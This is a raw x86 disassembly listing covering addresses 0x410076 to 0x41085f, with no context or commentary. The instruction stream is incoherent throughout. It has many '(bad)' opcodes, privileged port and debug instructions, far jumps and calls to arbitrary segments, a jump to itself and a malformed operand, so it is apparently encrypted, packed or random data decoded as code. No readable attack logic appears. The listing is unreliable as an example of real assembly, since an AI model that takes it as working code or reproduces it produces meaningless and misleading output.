  410076:	and    ecx,DWORD PTR [ebx+0x5e30aa5e]
  41007c:	outs   dx,BYTE PTR ds:[esi]
  41007d:	and    eax,0x82b09bfe
  410082:	jp     0x4100e8
  410084:	imul   edi,DWORD PTR [ecx+0x11fe7695],0xc1982ead
  41008e:	imul   edx,eax,0x60
  410091:	mov    eax,0xaa8cb361
  410096:	fwait
  410097:	pop    esp
  410098:	push   ss
  410099:	xor    BYTE PTR [eax-0x33],bl
  41009c:	aam    0x91
  41009e:	das    
  41009f:	push   edx
  4100a0:	sbb    al,0x68
  4100a2:	dec    edi
  4100a3:	mov    BYTE PTR gs:[esi-0x6399a74f],cl
  4100aa:	mov    dl,0x32
  4100ac:	mov    bl,0x5a
  4100ae:	ficomp DWORD PTR [edi+0x36]
  4100b1:	je     0x4100b1
  4100b3:	in     eax,dx
  4100b4:	fmul   st,st(2)
  4100b6:	jp     0x410114
  4100b8:	xlat   BYTE PTR ds:[ebx]
  4100b9:	adc    BYTE PTR [ebp*1+0x7751ea36],ch
  4100c0:	nop
  4100c1:	cmp    ah,BYTE PTR ds:0xac68d9ea
  4100c7:	cmp    BYTE PTR cs:[edx+0x57],al
  4100cb:	pushf  
  4100cc:	mov    ah,0x6d
  4100ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100cf:	std    
  4100d0:	mov    bl,BYTE PTR [ebp-0x785e2c4c]
  4100d6:	or     eax,0x8264b608
  4100db:	add    BYTE PTR [esi-0x7a8c5a3b],al
  4100e1:	retf   
  4100e2:	inc    ebp
  4100e3:	push   ds
  4100e4:	jno    0x41014a
  4100e6:	inc    ebx
  4100e7:	outs   dx,DWORD PTR ds:[esi]
  4100e8:	mov    al,ds:0x870a4a2d
  4100ed:	adc    al,0xf
  4100ef:	jle    0x41008e
  4100f1:	dec    edi
  4100f2:	sub    al,0xd2
  4100f4:	xchg   edx,eax
  4100f5:	or     dl,dl
  4100f7:	inc    edx
  4100f8:	test   DWORD PTR [esi+0x79b1a80d],ebx
  4100fe:	(bad)  
  4100ff:	mov    eax,0x4dcb5a7
  410104:	sub    DWORD PTR [ebx],0x53
  410107:	clc    
  410108:	cmp    BYTE PTR [ecx],0xce
  41010b:	cmc    
  41010c:	scas   eax,DWORD PTR es:[edi]
  41010d:	fsubr  DWORD PTR [edx-0x3ecb5176]
  410113:	mov    ecx,0xe78c54bf
  410118:	icebp  
  410119:	pop    esi
  41011a:	pcmpeqw mm2,mm7
  41011d:	outs   dx,BYTE PTR ds:[esi]
  41011e:	mov    bl,0x31
  410120:	or     al,0x78
  410122:	push   ds
  410123:	xchg   edx,eax
  410124:	mov    dl,0xd1
  410126:	sbb    DWORD PTR [ebx+ebx*8],ecx
  410129:	repz shr DWORD PTR [eax],0x50
  41012d:	adc    BYTE PTR [edi+0x3080dd6e],al
  410133:	inc    edi
  410134:	int    0x5c
  410136:	lods   al,BYTE PTR ds:[esi]
  410137:	add    ah,dh
  410139:	add    BYTE PTR [ecx],0xef
  41013c:	dec    ebx
  41013d:	jo     0x4100c9
  41013f:	out    dx,al
  410140:	fiadd  WORD PTR [edi+ebp*1-0x1f]
  410144:	xchg   esi,eax
  410145:	into   
  410146:	cmp    eax,0x7c9d12b8
  41014b:	gs and esp,esp
  41014e:	mov    cl,0xc5
  410150:	xchg   esi,eax
  410151:	test   al,0xe7
  410153:	or     eax,0x304908b6
  410158:	inc    edi
  410159:	sub    eax,0xb2137336
  41015e:	xchg   DWORD PTR [edi+0x711af099],eax
  410164:	les    esp,FWORD PTR [eax+0x4c]
  410167:	mov    esp,0xa9af776b
  41016c:	call   0x3b6e:0xc8f0795a
  410173:	call   0x51ff5bb2
  410178:	xor    BYTE PTR ds:0xd7adbb06,cl
  41017e:	rcl    DWORD PTR [esi+eiz*1],0xb5
  410182:	call   0x4c:0x7f2f16f6
  410189:	aaa    
  41018a:	pop    eax
  41018b:	push   eax
  41018c:	cld    
  41018d:	mov    cl,dh
  41018f:	cmp    bl,BYTE PTR [ebp+0x8]
  410192:	dec    eax
  410193:	sbb    edx,0x2a
  410196:	into   
  410197:	outs   dx,BYTE PTR ds:[esi]
  410198:	push   esi
  410199:	inc    eax
  41019a:	mov    ch,0x26
  41019c:	add    ah,BYTE PTR [esi-0x2e44ddf7]
  4101a2:	dec    esp
  4101a3:	out    dx,al
  4101a4:	mov    dl,0xee
  4101a6:	sub    al,0x5a
  4101a8:	push   esi
  4101a9:	jmp    0x41016e
  4101ab:	add    cl,bl
  4101ad:	cmp    BYTE PTR [edx],cl
  4101af:	pushf  
  4101b0:	lahf   
  4101b1:	mov    gs:0xf12373fb,eax
  4101b7:	ret    
  4101b8:	fs inc ebx
  4101ba:	in     eax,dx
  4101bb:	mov    eax,ds:0x61d0b63c
  4101c0:	cmp    DWORD PTR [edi],ecx
  4101c2:	push   ds
  4101c3:	loop   0x4101cf
  4101c5:	fisub  DWORD PTR [esi-0x644a782b]
  4101cb:	leave  
  4101cc:	xchg   ebx,eax
  4101cd:	fstp   QWORD PTR [esi+0x56b167a5]
  4101d3:	pop    edi
  4101d4:	dec    ecx
  4101d5:	mov    ecx,0x41c38fbf
  4101da:	push   es
  4101db:	adc    ecx,DWORD PTR [ecx+ecx*4+0x3d]
  4101df:	or     bh,BYTE PTR [edx+0x13]
  4101e2:	or     al,0xf5
  4101e4:	mov    DWORD PTR [edi+0x1d],ebp
  4101e7:	or     DWORD PTR [ecx],ebp
  4101e9:	and    dl,BYTE PTR [ebx+0x3720c03a]
  4101ef:	sbb    al,0x56
  4101f1:	xor    edx,DWORD PTR [edi]
  4101f3:	pop    es
  4101f4:	push   esp
  4101f5:	sti    
  4101f6:	ror    DWORD PTR [edx],1
  4101f8:	loop   0x4101dc
  4101fa:	dec    BYTE PTR [esi-0x42bd7cb2]
  410200:	xchg   ebp,eax
  410201:	std    
  410202:	lea    esp,[ebx+0x71]
  410205:	in     eax,dx
  410206:	fdivr  QWORD PTR [edx]
  410208:	add    BYTE PTR cs:[esi],0xe3
  41020c:	dec    esp
  41020d:	ss push ecx
  41020f:	icebp  
  410210:	jb     0x4101cb
  410212:	sub    al,0x66
  410214:	or     edi,DWORD PTR [ecx+0xd]
  410217:	pop    edx
  410218:	mov    ds:0xddfed712,al
  41021d:	push   ebx
  41021e:	fldcw  WORD PTR [edi+0x67]
  410221:	lea    esi,ds:0x68380f57
  410227:	sbb    ebp,ecx
  410229:	pop    ds
  41022a:	or     DWORD PTR [ebp-0x37],esp
  41022d:	in     al,0xb2
  41022f:	mov    esp,0xe247afce
  410234:	ds sub ch,dl
  410237:	xchg   edx,eax
  410238:	arpl   WORD PTR [edi+0x11],di
  41023b:	jnp    0x41027e
  41023d:	xchg   ebp,eax
  41023e:	inc    edx
  41023f:	dec    ecx
  410240:	push   esp
  410241:	js     0x4102a9
  410243:	jb     0x410273
  410245:	les    edi,FWORD PTR [ecx+0x376ebefa]
  41024b:	call   0x8019f0a7
  410250:	(bad)  
  410251:	sub    dl,ch
  410253:	jb     0x4102b8
  410255:	test   eax,0x9a191e56
  41025a:	int3   
  41025b:	xor    BYTE PTR [ecx],bl
  41025d:	jnp    0x4101fe
  41025f:	xchg   BYTE PTR [bx+si-0x73c9],dh
  410264:	(bad)  
  410265:	ret    
  410266:	and    ebx,DWORD PTR [ebx+0xa]
  410269:	sbb    eax,DWORD PTR [eax]
  41026b:	add    eax,0x9c67d5f7
  410270:	xchg   edi,eax
  410271:	xchg   esi,eax
  410272:	aad    0x65
  410274:	sbb    DWORD PTR [edi],esp
  410276:	xchg   cl,ah
  410278:	dec    ecx
  410279:	jnp    0x41028a
  41027b:	loope  0x41026a
  41027d:	je     0x41021c
  41027f:	ins    BYTE PTR es:[edi],dx
  410280:	xchg   ecx,eax
  410281:	mov    ah,0xce
  410283:	outs   dx,DWORD PTR ds:[esi]
  410284:	das    
  410285:	fs push 0xffffffae
  410288:	ret    0x9175
  41028b:	dec    esp
  41028c:	sbb    DWORD PTR [ecx-0x2f],esi
  41028f:	pop    es
  410290:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410291:	jne    0x41021c
  410293:	(bad)  
  410295:	jmp    0x41024a
  410297:	mov    dh,0x59
  410299:	outs   dx,DWORD PTR ds:[esi]
  41029a:	mov    dl,ch
  41029c:	shl    BYTE PTR [ebx+0x1e],1
  41029f:	in     eax,0xff
  4102a1:	jp     0x410270
  4102a3:	pop    ds
  4102a4:	mov    ebp,0x4e97be1a
  4102a9:	inc    ecx
  4102aa:	xor    al,0x61
  4102ac:	xchg   esi,eax
  4102ad:	sbb    al,0x5
  4102af:	mov    bh,BYTE PTR [esi-0x29]
  4102b2:	dec    edx
  4102b3:	xchg   DWORD PTR [eax+0x30],edx
  4102b6:	push   esi
  4102b7:	pop    edi
  4102b8:	jno    0x410291
  4102ba:	dec    ecx
  4102bb:	xor    eax,0x5bf52b9d
  4102c0:	sub    eax,0x3483b3a0
  4102c5:	push   0xb01bcf01
  4102ca:	fist   WORD PTR [edi+0x155d5b9]
  4102d0:	sbb    eax,0x2dee9cdb
  4102d5:	xor    BYTE PTR ds:0xdbc4cadd,0x8b
  4102dc:	and    BYTE PTR [esi-0x2e],bh
  4102df:	in     al,0x71
  4102e1:	pop    eax
  4102e2:	pop    eax
  4102e3:	retf   
  4102e4:	cmc    
  4102e5:	or     BYTE PTR ds:0x48323665,al
  4102eb:	and    edi,0xa8287d52
  4102f1:	push   0x51a86151
  4102f6:	mov    edi,0x36babfa2
  4102fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102fc:	fimul  WORD PTR [ecx+esi*4]
  4102ff:	fidivr DWORD PTR [eax-0x74]
  410302:	daa    
  410303:	popa   
  410304:	inc    edx
  410305:	stos   DWORD PTR es:[edi],eax
  410306:	repnz pop esp
  410308:	pop    esp
  410309:	push   ebp
  41030a:	pop    ebp
  41030b:	inc    ecx
  41030c:	stos   DWORD PTR es:[edi],eax
  41030d:	adc    bl,BYTE PTR [edi-0x603ab445]
  410313:	xor    BYTE PTR [ebx+0xd],al
  410316:	jp     0x41036a
  410318:	les    esi,FWORD PTR [edi-0x2f9a8b74]
  41031e:	mov    dh,0x7f
  410320:	std    
  410321:	add    ebp,ecx
  410323:	adc    eax,0xc9648d81
  410328:	call   0x45261ab1
  41032d:	xor    eax,0x8034b96
  410332:	sub    eax,DWORD PTR [eax]
  410334:	repnz pusha 
  410336:	xor    BYTE PTR [ebx+ebp*2-0x75],0x9
  41033b:	xor    eax,0xbe854f06
  410340:	lds    edi,FWORD PTR [ecx+0x16711a97]
  410346:	mov    ecx,0x3a06dc85
  41034b:	lahf   
  41034c:	je     0x4102d7
  41034e:	mov    ch,0x29
  410350:	dec    eax
  410351:	sub    ecx,DWORD PTR [ecx+0x29479cd5]
  410357:	dec    ebx
  410358:	aad    0xb7
  41035a:	or     al,0x28
  41035c:	inc    ebx
  41035d:	xor    BYTE PTR [ecx-0x4bd1ee7c],ah
  410363:	fidiv  DWORD PTR [edx-0x12e56a93]
  410369:	adc    dh,ah
  41036b:	and    eax,0xd756e49d
  410370:	xor    ch,BYTE PTR [edi+eax*2-0x7f]
  410374:	add    eax,0x52f46f1a
  410379:	pop    ebx
  41037a:	js     0x4103eb
  41037c:	sub    DWORD PTR [edx],esi
  41037e:	call   0xdefa91f9
  410383:	xlat   BYTE PTR ds:[ebx]
  410384:	pop    es
  410385:	or     eax,0x51328859
  41038a:	jnp    0x41037a
  41038c:	mov    eax,ds:0x31be8182
  410391:	adc    DWORD PTR ds:0xa955fda7,0xffffff83
  410398:	into   
  410399:	lahf   
  41039a:	test   eax,0x94b32e2a
  41039f:	push   ebp
  4103a0:	aaa    
  4103a1:	pusha  
  4103a2:	sub    DWORD PTR [esi+0x69829ee],0xffffffa1
  4103a9:	sbb    al,BYTE PTR [edi-0x20]
  4103ac:	push   ebp
  4103ad:	in     eax,dx
  4103ae:	int    0x37
  4103b0:	pop    esp
  4103b1:	sti    
  4103b2:	pop    es
  4103b3:	rcr    BYTE PTR [ebx+0xe9de3f3],0xdf
  4103ba:	mov    dl,0x9d
  4103bc:	adc    DWORD PTR [esi-0x76313d22],edi
  4103c2:	aad    0x8a
  4103c4:	loop   0x410377
  4103c6:	pop    edx
  4103c7:	loopne 0x4103a1
  4103c9:	or     DWORD PTR [edx+0x37],edx
  4103cc:	inc    edx
  4103cd:	dec    ebx
  4103ce:	push   ebx
  4103cf:	cli    
  4103d0:	lahf   
  4103d1:	jl     0x4103e7
  4103d3:	test   eax,0x24ecf890
  4103d8:	rcr    BYTE PTR [ebp-0x6c],1
  4103db:	test   DWORD PTR [esi],0xe69e7735
  4103e1:	adc    bh,BYTE PTR [eax-0x6a]
  4103e4:	push   ebp
  4103e5:	ret    
  4103e6:	out    0xd7,al
  4103e8:	xor    BYTE PTR [esi-0x5bdfc25f],dl
  4103ee:	int    0xf4
  4103f0:	lock call 0x5ffb3fb4
  4103f6:	xchg   edi,eax
  4103f7:	dec    ebx
  4103f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103f9:	jae    0x41043d
  4103fb:	cmp    BYTE PTR [ebx],ah
  4103fd:	push   ebx
  4103fe:	xlat   BYTE PTR ds:[ebx]
  4103ff:	or     BYTE PTR [esi],0xeb
  410402:	cli    
  410403:	or     eax,DWORD PTR [eax]
  410405:	jnp    0x41045c
  410407:	ja     0x410411
  410409:	mov    eax,ds:0xa80d24a6
  41040e:	fild   WORD PTR [eax+0x4c]
  410411:	mov    edi,0x8d89c9db
  410416:	mov    dh,0x88
  410418:	arpl   bp,ax
  41041a:	adc    edi,DWORD PTR [ebx]
  41041c:	ins    DWORD PTR es:[edi],dx
  41041d:	jae    0x410465
  41041f:	jns    0x41040a
  410421:	ins    BYTE PTR es:[edi],dx
  410422:	je     0x410427
  410424:	outs   dx,DWORD PTR ds:[esi]
  410425:	xchg   edi,eax
  410427:	dec    ebx
  410428:	arpl   WORD PTR [ecx],si
  41042a:	pop    esi
  41042b:	jle    0x410468
  41042d:	xor    cl,BYTE PTR gs:[esi-0x6e2f34a4]
  410434:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410435:	xchg   ecx,eax
  410436:	fnstsw ax
  410438:	test   eax,0xd8545206
  41043d:	dec    eax
  41043e:	stc    
  41043f:	addr16 mov edx,0x2f60bf57
  410445:	jmp    DWORD PTR [esi]
  410447:	lods   al,BYTE PTR ds:[esi]
  410448:	aam    0xf9
  41044a:	adc    eax,0xe8aaf21c
  41044f:	test   BYTE PTR [ecx-0x19055e63],ah
  410455:	lds    esi,FWORD PTR [edi+0x3b]
  410458:	pop    ss
  410459:	mov    al,ds:0x18d2a12
  41045e:	bound  edx,QWORD PTR [eax]
  410460:	add    eax,0xefcb57e8
  410465:	dec    edi
  410466:	imul   eax,DWORD PTR [esp+edx*8-0x2a],0x31681408
  41046e:	mov    ecx,0x7a5508a4
  410473:	retf   
  410474:	jne    0x4104be
  410476:	rcl    DWORD PTR [edx-0x75d75d5],0xb
  41047d:	xchg   esp,eax
  41047e:	jl     0x41045f
  410480:	clc    
  410481:	aaa    
  410482:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410483:	jg     0x410429
  410485:	lock dec ebx
  410487:	sub    BYTE PTR ds:0x2f81058d,0xa1
  41048e:	int    0x63
  410490:	inc    eax
  410491:	mov    dl,0xca
  410493:	hlt    
  410494:	js     0x410463
  410496:	sti    
  410497:	xor    eax,0xf24bd1c4
  41049c:	sub    BYTE PTR [edi],dh
  41049e:	inc    ecx
  41049f:	mov    cl,0x4c
  4104a1:	xchg   ebp,eax
  4104a2:	div    eax
  4104a4:	std    
  4104a5:	and    ebx,DWORD PTR [eax+0x428b682b]
  4104ab:	mov    al,0x24
  4104ad:	ret    0x12dc
  4104b0:	ss xchg esi,eax
  4104b2:	cld    
  4104b3:	dec    edi
  4104b4:	adc    BYTE PTR [eax+0x68],0xd1
  4104b8:	xchg   edx,eax
  4104b9:	pop    edi
  4104ba:	sahf   
  4104bb:	out    dx,eax
  4104bc:	mov    ebx,0xfb194810
  4104c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104c3:	jae    0x410534
  4104c5:	hlt    
  4104c6:	aam    0x78
  4104c8:	call   0x85740cdf
  4104cd:	jbe    0x410529
  4104cf:	stos   BYTE PTR es:[edi],al
  4104d0:	test   ch,0x78
  4104d3:	inc    eax
  4104d4:	sahf   
  4104d5:	xor    edi,ecx
  4104d7:	scas   al,BYTE PTR es:[edi]
  4104d8:	or     al,0x59
  4104da:	xor    DWORD PTR [esp+esi*2+0x26fec088],ebx
  4104e1:	jo     0x410474
  4104e3:	pop    ds
  4104e4:	daa    
  4104e5:	and    ah,BYTE PTR [eax+0x1c419a1b]
  4104eb:	mov    BYTE PTR [eax],al
  4104ed:	mov    bl,dl
  4104ef:	icebp  
  4104f0:	jb     0x41050a
  4104f2:	fs or  al,bh
  4104f5:	sub    DWORD PTR [ebp-0x1],esp
  4104f8:	(bad)  
  4104fa:	mov    WORD PTR [ebx-0x36],gs
  4104fd:	les    eax,FWORD PTR [eax-0x59]
  410500:	in     eax,dx
  410501:	sub    bh,BYTE PTR [edx]
  410503:	shr    esi,0xaf
  410506:	idiv   BYTE PTR [ecx]
  410508:	cld    
  410509:	and    eax,0xf33769d7
  41050e:	dec    esi
  41050f:	jecxz  0x410525
  410511:	ins    DWORD PTR es:[edi],dx
  410512:	test   al,0xf
  410514:	jg     0x410520
  410516:	(bad)  
  410517:	jecxz  0x41053e
  410519:	mov    dl,0xee
  41051b:	leave  
  41051c:	aaa    
  41051d:	jle    0x410547
  41051f:	pusha  
  410520:	mov    ebx,0x2e53aaaa
  410525:	add    DWORD PTR [edi+0x55],ebx
  410528:	inc    esi
  410529:	push   0xffffff96
  41052b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41052c:	ret    0x856a
  41052f:	arpl   sp,bx
  410531:	or     edi,edx
  410533:	or     ebp,DWORD PTR [ecx+0x11b627c0]
  410539:	cmp    ebp,DWORD PTR [edi+eax*8+0x35]
  41053d:	cld    
  41053e:	pop    ebp
  41053f:	adc    eax,0x7b6081bd
  410544:	ror    DWORD PTR [esp+eax*2+0x87e7d4d],cl
  41054b:	push   esp
  41054c:	push   ebx
  41054d:	cmp    al,0xf2
  41054f:	sahf   
  410550:	cld    
  410551:	bound  esi,QWORD PTR [edx+0x5f3ba95e]
  410557:	popf   
  410558:	outs   dx,DWORD PTR ds:[esi]
  410559:	dec    esp
  41055a:	ficom  WORD PTR [ecx-0x55]
  41055d:	push   ecx
  41055e:	dec    ebp
  41055f:	stos   BYTE PTR es:[edi],al
  410560:	std    
  410561:	sbb    eax,0xa188e25d
  410566:	(bad)  
  410567:	icebp  
  410568:	or     DWORD PTR [ecx+edx*4],0x75
  41056c:	mov    bl,0xc4
  41056e:	das    
  41056f:	jb     0x4105e8
  410571:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410573:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410574:	(bad)  
  410575:	dec    ebx
  410576:	and    al,0xbb
  410578:	xor    al,0xcf
  41057a:	mov    esp,DWORD PTR [ebx-0x9bfbe7b]
  410580:	jmp    0x3fd:0x222e7988
  410587:	fsubrp st(1),st
  410589:	mov    ah,0x66
  41058b:	push   esp
  41058c:	cmp    al,0x33
  41058e:	pop    esp
  41058f:	jnp    0x4105e7
  410591:	rol    BYTE PTR [eax+0x54],1
  410594:	jmp    0xc54:0xaa74a2c4
  41059b:	in     al,dx
  41059c:	mov    ebx,0xcea8c495
  4105a1:	repz push es
  4105a3:	call   0x99d2:0x7da28ab7
  4105aa:	xlat   BYTE PTR ds:[ebx]
  4105ab:	push   edx
  4105ac:	aas    
  4105ad:	jg     0x4105e0
  4105af:	aas    
  4105b0:	sub    BYTE PTR [edi-0x70],dh
  4105b3:	std    
  4105b4:	out    0x77,eax
  4105b6:	sbb    DWORD PTR [esi],0x49339845
  4105bc:	xchg   esp,eax
  4105bd:	xchg   BYTE PTR [edx-0x4990aea2],bh
  4105c3:	pop    eax
  4105c4:	adc    DWORD PTR [esi-0x62ca6482],ecx
  4105ca:	out    dx,al
  4105cb:	sahf   
  4105cc:	int    0x36
  4105ce:	lahf   
  4105cf:	fcmovnbe st,st(3)
  4105d1:	mov    ebx,0xfff10fe7
  4105d6:	xor    DWORD PTR [eax+0x906e971],eax
  4105dc:	adc    ebp,DWORD PTR [eax+ebp*1]
  4105df:	xchg   ebp,eax
  4105e0:	push   esi
  4105e1:	mov    ebx,0x9ef73f41
  4105e6:	int3   
  4105e7:	sti    
  4105e8:	rol    BYTE PTR [esi+0x74b3b967],0xd7
  4105ef:	aam    0x72
  4105f1:	ror    DWORD PTR [esp+ebp*2+0x456374b0],1
  4105f8:	push   ss
  4105f9:	ret    
  4105fa:	adc    bl,BYTE PTR [edx+0x16]
  4105fd:	xcrypt-cbc 
  410600:	push   edx
  410601:	dec    ebp
  410602:	or     DWORD PTR [ebp-0x32],eax
  410605:	out    0x6a,al
  410607:	xor    al,0xcd
  410609:	std    
  41060a:	repz mov ah,dl
  41060d:	and    BYTE PTR [ecx-0x78],dl
  410610:	mov    ds:0xf541915a,eax
  410615:	fcmovu st,st(7)
  410617:	or     BYTE PTR [eax-0x41],bl
  41061a:	cmp    dh,BYTE PTR [edi-0x2199fa4f]
  410620:	(bad)  
  410622:	or     al,bh
  410624:	sar    BYTE PTR fs:[edi+eiz*4],1
  410628:	dec    edi
  410629:	mov    edx,0xca71b5a0
  41062e:	dec    ebx
  41062f:	bound  edx,QWORD PTR [ecx+0x18ef318b]
  410635:	and    BYTE PTR [ecx+edi*8-0x3a],ah
  410639:	or     al,0x60
  41063b:	mov    ch,0xe0
  41063d:	out    0xf0,al
  41063f:	dec    esi
  410640:	dec    esp
  410641:	mov    al,ds:0xf26cacac
  410646:	icebp  
  410647:	add    cl,0xdc
  41064a:	ror    DWORD PTR [ecx],cl
  41064c:	sub    al,0x53
  41064e:	loope  0x410621
  410650:	mov    esi,?
  410652:	lods   al,BYTE PTR ds:[esi]
  410653:	mov    cl,0x16
  410655:	imul   esi,ebp,0xfffffffd
  410658:	xchg   BYTE PTR [edi],dl
  41065a:	(bad)  
  41065b:	test   eax,0x8dc83201
  410660:	pop    es
  410661:	xor    al,0x8a
  410663:	xchg   ebp,eax
  410664:	pop    ss
  410665:	mov    edx,0x6b7d1aa4
  41066a:	and    BYTE PTR [edi-0x46],al
  41066d:	add    esi,ebx
  41066f:	xchg   ecx,eax
  410670:	inc    eax
  410671:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410672:	ss inc edx
  410674:	pop    eax
  410675:	jl     0x41064a
  410677:	out    dx,al
  410678:	jge    0x4106aa
  41067a:	xor    edx,ecx
  41067c:	enter  0x7479,0xc1
  410680:	fs jo  0x4106b6
  410683:	repnz loop 0x410670
  410686:	push   eax
  410687:	outs   dx,BYTE PTR ds:[esi]
  410688:	loop   0x410619
  41068a:	inc    esp
  41068b:	call   0x492d395b
  410690:	jne    0x41066f
  410692:	out    0x2a,eax
  410694:	dec    cl
  410696:	in     eax,0x36
  410698:	mov    bh,0x85
  41069a:	les    ecx,FWORD PTR [esi-0x45399745]
  4106a0:	xchg   edx,eax
  4106a1:	sar    BYTE PTR [esi-0x70],1
  4106a4:	fst    DWORD PTR [edx+ebx*8-0x791880b0]
  4106ab:	js     0x410685
  4106ad:	mov    al,BYTE PTR [edi-0x17]
  4106b0:	clc    
  4106b1:	leave  
  4106b2:	outs   dx,DWORD PTR ds:[esi]
  4106b3:	icebp  
  4106b4:	clc    
  4106b5:	cmp    eax,0xa148feb3
  4106ba:	(bad)  
  4106bb:	jo     0x410689
  4106bd:	jo     0x4106c6
  4106bf:	mov    al,0xc0
  4106c1:	mov    esp,esi
  4106c3:	push   eax
  4106c4:	pushf  
  4106c5:	icebp  
  4106c6:	add    eax,0xcef50593
  4106cb:	push   ds
  4106cc:	push   ebx
  4106cd:	push   eax
  4106ce:	xor    DWORD PTR [ebx+esi*4],eax
  4106d1:	adc    DWORD PTR [ecx+0x358fa0a7],ecx
  4106d7:	adc    ecx,edi
  4106d9:	into   
  4106da:	and    al,0x84
  4106dc:	shl    dh,cl
  4106de:	not    ah
  4106e0:	popa   
  4106e1:	mov    ds:0x575a0a18,al
  4106e6:	or     ch,BYTE PTR [esi+0x2c513511]
  4106ec:	adc    ecx,0x27520359
  4106f2:	adc    BYTE PTR [edx],dl
  4106f4:	jmp    0x41072b
  4106f6:	mov    eax,0xde891194
  4106fb:	es cld 
  4106fd:	sub    BYTE PTR [ecx],bh
  4106ff:	jmp    0x75b4824
  410704:	jne    0x410752
  410706:	inc    edx
  410707:	inc    esi
  410708:	int3   
  410709:	test   DWORD PTR [edx+0x33],edi
  41070c:	xchg   BYTE PTR [eax-0xc],dl
  41070f:	xor    BYTE PTR [edi],al
  410711:	push   ecx
  410712:	ds rcr ebp,0x3
  410716:	add    eax,0x34b4e7de
  41071b:	mov    bh,0x13
  41071d:	(bad)  
  41071e:	push   edx
  41071f:	push   eax
  410720:	ficomp WORD PTR [ebx-0x684197b6]
  410726:	test   al,0x55
  410728:	jne    0x4107a2
  41072a:	outs   dx,DWORD PTR ds:[esi]
  41072b:	jle    0x41074a
  41072d:	int    0x33
  41072f:	or     DWORD PTR ds:0xd0d1f0f7,esi
  410735:	ret    
  410736:	cs or  eax,0xe72aa3fa
  41073c:	push   edi
  41073d:	(bad)  
  41073e:	mov    dl,0xc8
  410740:	mov    ebp,0xf798b4f9
  410745:	push   0xf00d00f3
  41074a:	out    dx,eax
  41074b:	frndint 
  41074d:	shr    DWORD PTR [edx],0x22
  410750:	outs   dx,DWORD PTR ds:[esi]
  410751:	cmp    al,0xec
  410753:	aas    
  410754:	mov    esi,0x581750bb
  410759:	mov    dl,0x7
  41075b:	push   ebx
  41075c:	popa   
  41075d:	pop    es
  41075e:	aas    
  41075f:	xor    ecx,DWORD PTR [eax+0x451047d9]
  410765:	xchg   ebx,eax
  410766:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410767:	mov    ebx,0x12acd80b
  41076c:	push   cs
  41076d:	add    DWORD PTR [ebx],edi
  41076f:	mov    cl,0x47
  410771:	lods   al,BYTE PTR ds:[esi]
  410772:	ret    
  410773:	add    esi,DWORD PTR [eax+ebp*1]
  410776:	or     eax,0x96e8c002
  41077b:	ss pop ds
  41077d:	cld    
  41077e:	out    dx,eax
  41077f:	push   ds
  410780:	icebp  
  410781:	pop    ebp
  410782:	adc    eax,0x71fe44a7
  410787:	adc    BYTE PTR [edi],dl
  410789:	retf   
  41078a:	rcl    DWORD PTR [ebp-0x75026103],1
  410790:	sbb    cl,BYTE PTR es:[ebp+0x504570fd]
  410797:	pop    ebp
  410798:	mov    al,ds:0xf898269c
  41079d:	ret    
  41079e:	lds    esi,FWORD PTR [edi+0x4c]
  4107a1:	fstp   TBYTE PTR [edi+esi*2-0x44]
  4107a5:	push   ds
  4107a6:	pop    ebp
  4107a7:	add    DWORD PTR [edx+0x7080d469],0x5b6df40d
  4107b1:	xchg   DWORD PTR [edi+0x7f7651c8],ebx
  4107b7:	shl    ebp,1
  4107b9:	pop    ebx
  4107ba:	mov    bl,BYTE PTR [edi+0x0]
  4107bd:	stos   BYTE PTR es:[edi],al
  4107be:	dec    ebx
  4107bf:	aad    0x1b
  4107c1:	jge    0x41080c
  4107c3:	xchg   ebx,eax
  4107c4:	fst    DWORD PTR [ebp-0x4206fdfa]
  4107ca:	(bad)  
  4107cc:	stos   DWORD PTR es:[edi],eax
  4107cd:	inc    ebx
  4107ce:	cmp    ecx,esp
  4107d0:	nop
  4107d1:	jmp    0xa4237dd7
  4107d6:	xchg   BYTE PTR [ebp+0x5b749bb5],ch
  4107dc:	or     al,0x13
  4107de:	jno    0x410859
  4107e0:	pshufhw xmm2,xmm0,0x8f
  4107e5:	rcr    BYTE PTR [edi-0x41],1
  4107e8:	cdq    
  4107e9:	or     DWORD PTR [ecx+eax*1+0x1278be71],ecx
  4107f0:	inc    esp
  4107f1:	sti    
  4107f2:	retf   
  4107f3:	inc    edx
  4107f4:	xchg   ebp,eax
  4107f5:	mov    cl,0x2c
  4107f7:	pop    ebx
  4107f8:	inc    eax
  4107f9:	xchg   esp,eax
  4107fa:	jb     0x410846
  4107fc:	mov    ebx,0xcf9686e5
  410801:	jmp    0x7bff:0x7ba270a2
  410808:	adc    DWORD PTR [ecx-0x6fb3951f],esp
  41080e:	dec    ebx
  41080f:	jg     0x410820
  410811:	push   eax
  410812:	mov    edx,0x140e8cfd
  410817:	outs   dx,DWORD PTR ds:[esi]
  410818:	mov    eax,0x7784b2a9
  41081d:	mov    BYTE PTR [ebx],ah
  41081f:	pop    ebp
  410820:	pop    eax
  410821:	jg     0x410816
  410823:	fiadd  WORD PTR [eax-0x30ffd3ee]
  410829:	fidivr WORD PTR [esi+0x2f]
  41082c:	pop    ebp
  41082d:	adc    DWORD PTR [edx+0x48],ebx
  410830:	dec    eax
  410831:	sub    al,0xac
  410833:	and    al,0x5f
  410835:	stos   DWORD PTR es:[edi],eax
  410836:	in     eax,dx
  410837:	ds and eax,0xd1728538
  41083d:	shr    DWORD PTR [edx+0x3a],0x53
  410841:	push   edi
  410842:	ficom  WORD PTR [esi-0xeb937fb]
  410848:	retf   
  410849:	and    BYTE PTR [edx+0xd],ch
  41084c:	xor    DWORD PTR [edx+0x3b],0xffffff9c
  410850:	inc    eax
  410851:	cmp    BYTE PTR [ecx],bl
  410853:	jl     0x41082f
  410855:	inc    BYTE PTR [ebx+0x611785b0]
  41085b:	mov    cl,0xf9
  41085d:	mov    ch,0xc2
  41085f:	popa   
